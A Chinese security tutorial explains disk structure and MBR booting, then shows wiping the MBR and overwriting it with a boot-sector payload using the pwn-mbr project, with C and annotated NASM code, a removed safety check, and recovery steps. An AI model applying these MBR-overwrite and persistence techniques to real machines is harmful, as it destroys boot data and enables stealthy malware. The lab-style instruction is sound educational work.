***本文作者：追影人，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 0×01 硬盘的逻辑结构

**机械磁盘在物理结构上是由磁片、马达、磁头、定位系统等部件构成，通常一块磁盘有若干块磁片构成，为了方便定位统一管理，将这些磁片进行了编号。一个盘片的两面各有一个磁头（Heads），每个盘片被划分成若干个同心圆磁道，每个盘片的半径均为固定值R的同心圆形成柱面(Cylinders)，从外至里编号为0、1、2……每个盘片上的每个磁道又被划分为若干个扇区，一个扇区通常容量为512byte，并按照一定规则编号为1、2、3……形成Cylinders×Heads×Sector个扇区，这三个参数即可定位一个扇区。从这里可以看出扇区是磁盘的最小存储单元，对磁盘的读写只能以扇区为单位。（请务必注意最后一句话，后面的实验会用到）**

>  **Question1：磁盘的扇区是什么时候划分的？**
>
>
> Answer：在对磁盘进行低级格式化时（磁盘出厂前已经完成），会划分出柱面和磁道，将磁道划分为若干个扇区，每个扇区又划分出标识部分ID、间隔区、GAP和数据区DATA等。而我们通常在操作系统中所用的格式化是高级格式化，仅仅是清除硬盘上的数据，生成引导信息，初始化FAT表，标注逻辑坏道等。需要注意的是低级格式化是一种损耗性操作，对硬盘寿命有一定的负面影响。

由于后续实验需要了解到磁盘数据的具体含义，在这里简要介绍一下。硬盘上的数据按照其不同的特点和作用大致可分为5部分：MBR区、DBR区、FAT区、DIR区和DATA区。

###  **1、MBR区**

MBR（Main Boot Record
主引导记录区）位于整个硬盘的0磁道0柱面1扇区。MBR只占用该扇区的前446个字节，另外的64个字节属于DPT（Disk Partition
Table硬盘分区表），最后两个字节“55，AA”是分区的结束标志，这两部分构成了硬盘的主引导扇区。

![1.png](https://image.3001.net/images/20190529/1559132245_5cee785537aa4.png!small)

### 2、DBR区

DBR（Dos Boot
Record操作系统引导记录区）位于硬盘的0磁道1柱面1扇区，是操作系统可以直接访问的第一个扇区，它包括一个引导程序和一个被称为BPB（Bios
Parameter Block）的本分区参数记录表，DBR是在高级格式化时产生。

### 3、FAT区

FAT（File Allocation
Table文件分配表）区位于DBR区之后。文件在存储时并非连续存储在某个区域，而是分成若干段进行链式存储，FAT便是用于保存段与段之间的连接信息。由于FAT对于文件管理十分重要，所以在原FAT的后面会有一个备份FAT。

### 4、DIR区

DIR（Directory）是根目录区，位于备份FAT表之后，记录着根目录下每个文件(目录)的起始单元，文件的属性等。

### 5、数据(DATA)区

数据区位于DIR区之后，用于存储真正的用户原始数据。

## 0×02 MBR引导原理

****计算机在按下电源键键以后，开始执行主板bios程序。进行完一系列检测和配置以后。开始按bios中设定的系统引导顺序引导系统。当设置为从硬盘启动时，Bios执行完自己的程序后如何把执行权交给硬盘呢？交给硬盘后又执行了什么呢？
****

这些问题便是需要MBR来解决的，bios在执行自己固有的程序以后就会跳转到mbr中的第一条指令，将系统的控制权交由mbr来执行。需要注意的是MBR不随操作系统的不同而不同，意即不同的操作系统可能会存在相同的MBR，即使不同，MBR也不会夹带操作系统的性质，具有公共引导的特性。

> Question2：所有电脑都有MBR引导区吗？
>
> Answer:其中BIOS设置中，有两种启动进入操作系统的方法，分别是为UEFI和Legacey。
> 其中Legacy是早先出现的，而UEFI（Unified Extensible Firmware
> Interface）是后来发展出的可扩展固件接口。两种模式分别对应的硬盘分区格式：MBR格式和GUID（GPT）格式，所以只有采用Legacy启动的才会拥有MBR扇区。

## 0×03 摧兰折玉——暴力擦写MBR

如果我们破坏了MBR会发生什么？利用winhex对MBR区域进行00填充操作，由于针对磁盘的读写操作需要高权限进行，所以请用管理员启动winhex。

![2.png](https://image.3001.net/images/20190529/1559132371_5cee78d33c769.png!small)

填充后：

![3.PNG](https://image.3001.net/images/20190529/1559132380_5cee78dc542a0.png!small)

修改后切记保存，才能使修改后的数据真正写入到磁盘中。然后重启电脑。

哦，对了，实验务必在虚拟机中进行，务必做好快照，哈哈哈~~~~~前面忘说了。

## 0×04 偷梁换柱——篡改MBR

我们成功的破坏了MBR，既然Bios将控制权交给了MBR执行，我们岂不是可以利用MBR做一些其他事。这里我们用到程序<https://github.com/DavidBuchanan314/pwn-mbr>，该程序是将自己的payload写入到MBR区域执行。

### 1、制作payload

工程中的payload.s文件属于汇编语言程序，需要利用其进行编译生成二进制payload。笔者刚开始选择masm对其进行编译，报一堆错误，后来才发现该汇编语法规范属于nasm，使用nasm顺利生成了payload。

### 2、RING3层直接读写磁盘数据

Windows利用内核模式与用户模式的严格切分确保了可靠性，这两种模式分别对应了CPU的Ring0与Ring3级别，在Ring3级下执行的程序是不能够直接访问到硬件的。如果要读写磁盘上的扇区数据，需要利用INT中断来进行，但是也必须是在Ring0级才可以进行操作，而进入Ring0级的方法有：设备驱动程序、调用门、任务门、中断门、陷阱门等，这势必提升了操作门槛。

而程序中对磁盘的操作直接使用了fopen等文件操作函数，这是为什么？Windows的核心之一就是强大的文件管理能力，将所有资源都看成文件，无论是存储在硬盘上的文件还是五花八门的硬件设备（硬盘，显示器等），所以硬件也拥有自己特殊的文件路径。

程序启动时带入的参数是物理驱动器的路径：

    
    
    fp = fopen(argv[1], "r+");
    
     if (fp == NULL) {
    
     printf("Could not open %s for read/write. Are you sure you have permission?\n", argv[1]);
    
     return 1;
    
     }
    
    fread(&mbr, SECTOR_SIZE, 1, fp);

Windows平台的驱动器名一般为 **“** **\\\\.\PHYSICALDRIVE0"** ，后面的数字以此类推；linux平台通常为
**dev\sda** 。

### 3、程序的运行

通过阅读源码，可知程序对磁盘进行了读写操作，而fopen等对物理驱动器的操作必须具备调试权限，否则就会打开失败，所以我们选择管理员运行程序。

![5.png](https://image.3001.net/images/20190529/1559132504_5cee7958f0b50.png!small)

运行后重启系统，我们看到屏幕上的字串。

![6.png](https://image.3001.net/images/20190529/1559132510_5cee795ef38b3.png!small)

按下回车键后，windows系统正常启动。

### 4、阅读程序

程序中这段代码在实际执行中会进入而使得程序退出，所以需要注释掉，确保顺利执行。

    
    
    if (mbr[0] != ASM_JMP) { // this is only a heuristic for added safety
    
     printf("No bootcode detected. Aborting!\n");
    
     fclose(fp);
    
     return 1;
    
    }

通过对源码的阅读，大致梳理出程序流程：

读取前512字节，即MBR所在的扇区

向后寻找一块全0的空白扇区

    
    
    char isUsed = 1;
    
     while (isUsed) {
    
     fread(&readbuf, SECTOR_SIZE, 1, fp);
    
     for (int i = isUsed = 0; i < SECTOR_SIZE; isUsed |= readbuf[i++]);
    
    }

将原始MBR数据异或0xA6后存储在该空白区域

    
    
    for (int i = 0; i < SECTOR_SIZE; i++) mbr[i] ^= 0xA6;

将payload写入到MBR扇区

需要注意的是，笔者在调试程序时发现payload在写入时总是失败，提示参数错误，后来发现在对硬盘读写时，必须是512字节的整数倍才行，所以需要对源程序进行修改，将payload补齐到512字节后写入MBR扇区。

经过上述修改后，系统重启时并没有顺利启动我们的payload，这里需要回顾第一章节里提到的MBR区的数据格式，在MBR所在的第一扇区除了前446字节是MBR程序外，后面的64个字节属于DPT（Disk
Partition
Table硬盘分区表），最后两个字节“55，AA”是分区的结束标志。所以我们在写入payload的同时应该修复DPT和结束标志，程序中需要在读取原始MBR数据后加入以下代码。

> fread(&mbr, SECTOR_SIZE, 1, fp);//从磁盘中读取MBR扇区
>
> memcpy(payload, mbr, SECTOR_SIZE);//将原始MBR数据copy到payload
>
> memset(payload, 0, 446);//将前446清空，留下后面的DPT表和结束标志

### 5、解读payload

在阅读payload汇编代码前，需要明确一点：MBR在运行时是被加载到内存地址为0:0x7C00的空间里执行。

backup_magic equ 0x0DD03713 ; 约定备份MBR的头部标志0x1337D00D ，便于搜索查找：

    
    
    magic_addr equ 0x7FFC
    
    payload_len equ 0x1B8 ; tells us how much of the MBR to copy back
    
     org 0x7C00
    
     bits 16
    
    start:
    
     jmp realstart ; Just to look like a more normal MBR
    
     nop
    
    realstart:
    
     cli
    
     xor ax, ax ; 清空各个寄存器
    
     mov es, ax
    
     mov fs, ax
    
     mov gs, ax
    
     mov ah, 0x0E ; "Teletype output" mode for int 0x10
    
     xor bl, bl
    
    .sLoop sub bl, 1 ; 将bl设置为255，为了循环打印255次pwn文字
    
     jz doCopy ;判断是否打印完毕，完毕则跳转至docopy处
    
     mov si, pwned
    
    .cLoop lodsb ; AL <- [DS:SI] && SI++ 将目的地址的内容读到源地址，复制pwn文字操作
    
     xor al, 0x83 ;pwn文字解密操作
    
     jz .sLoop
    
     int 0x10 ;输出
    
     jmp .cLoop
    
    doCopy: 
    
     xor ah, ah
    
     int 0x16 ; 等待键盘输入回车键
    
    ; 开始搜索定位mbr备份的位置
    
    .scan 
    
    mov si, DAPACK 
    
     mov ah, 0x42
    
     int 0x13 ;使用int13h,ah=0x42读取扇区
    
     mov ax, [d_lba] ;将ax赋值为1号扇区
    
     add ax, 1 ;扇区号累加操作
    
     mov [d_lba], ax
    
     mov eax, [magic_addr] ;读取本扇区最开头的标记位数据
    
     mov ebx, backup_magic
    
     cmp eax, ebx ;对比标记位数据，判断是都否为备份的扇区
    
     jne .scan
    
     ; 将备份扇区还原到MBR的位置
    
     mov si, stage2
    
     mov bx, 0x8000
    
    .copy lodsb ;将stage2区块的指令代码读写到内存0x8000位置处
    
     mov [bx], al
    
     add bx, 1
    
     cmp si, stage2end
    
     jl .copy
    
     jmp 0x8000 ;跳转到0x8000位置开始执行stage2代码
    
    stage2: ; 该块代码会被重新装载到内存0x8000位置
    
     mov si, 0x7E00
    
    .copy lodsb
    
     xor al, 0xA6 ;备份的MBR数据进行解密操作
    
     mov [si-0x201], al ;将还原的MBR装载到内存0x7C00处
    
     cmp si, 0x7E00 + payload_len
    
     jl .copy
    
     sti
    
     jmp 0:0x7C00 ;跳转到0x7C00内存处开始执行还原的MBR，从而正常启动操作系统
    
    stage2end:
    
    pwned: db 206, 193, 209, 163, 211, 212, 205, 198, 199, 162, 163, 163, 163, 131 ;该数据为异或后的数据 "MBR PWNED!   " ^ 0x83
    
     align 4 ; needed for Disk Address Packet
    
    DAPACK:
    
     db 0x10
    
     db 0
    
    blkcnt: dw 1 ; int 13 resets this to # of blocks actually read/written
    
    db_add: dw 0x7E00 ; memory buffer destination address (0:7E00)
    
     dw 0 ; in memory page zero
    
    d_lba: dd 1 ; put the lba to read in this spot
    
    dd 0 ; more storage bytes only for big lba's ( > 4 bytes )

**疑惑：笔者在进行测试时发现，xp/win2003系统均可完成上述实验的全过程，而换成win7会就会发现在出现pwn文字后，按下回车键无任何反应，系统并没有正常启动。**

## 0×05 凤凰涅槃--MBR修复

如果有同学不慎中招了MBR病毒，不要慌张，下面我们来讲如何修复被破坏的MBR扇区。根据之前我们对MBR工作机制的认识，当MBR被破坏时，系统无法正常引导，磁盘分区信息丢失，所以需要修复这两部分才可以正常启动系统。

### 1、下载PE系统，利用光驱或U盘等方式，启动PE系统；

### 2、打开PE系统中的diskgenius分区工具，可以看到硬盘上的数据全都不见了；

![7.PNG](https://image.3001.net/images/20190529/1559132613_5cee79c56a904.png!small)

### 3、右键点击硬盘选择“搜索已丢失的分区”；

### 4、选择“整个硬盘”，点击开始搜索，diskgenius会在整个磁盘范围内搜索匹配分区表；

![9.PNG](https://image.3001.net/images/20190529/1559132639_5cee79dfcf845.png!small)

### 5、当搜索到分区信息时会弹框确认，请按“保留”按键；

### 6、搜索完毕后，点击保存按钮；

###
![10.PNG](https://image.3001.net/images/20190529/1559133324_5cee7c8c81f52.png!small)

7、此时可以看到磁盘上的文件信息都回来了；

![11.PNG](https://image.3001.net/images/20190529/1559132666_5cee79fa33144.png!small)

8、重建主引导记录

![8.PNG](https://image.3001.net/images/20190529/1559132674_5cee7a029fbc3.png!small)

### 9、进入PE系统的“修复系统引导”程序，对系统引导进行修复。

### 10、Reset，大功告成！

## 0×06 后记

前面我们了解了MBR磁盘锁的基本运行机制，以及MBR扇区修复技术，其实有关MBR的利用远不止这些，在一些高级利用场景中，我们可以利用修改MBR代码的方式实现病毒程序的持久化，而且这种形式的持久化方式是不依赖于操作系统，更加隐蔽难以察觉，因此部分杀毒软件也紧盯MBR扇区，利用多种技术对MBR扇区进行了写保护，防止病毒的篡改侵蚀。

 ***本文作者：追影人，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

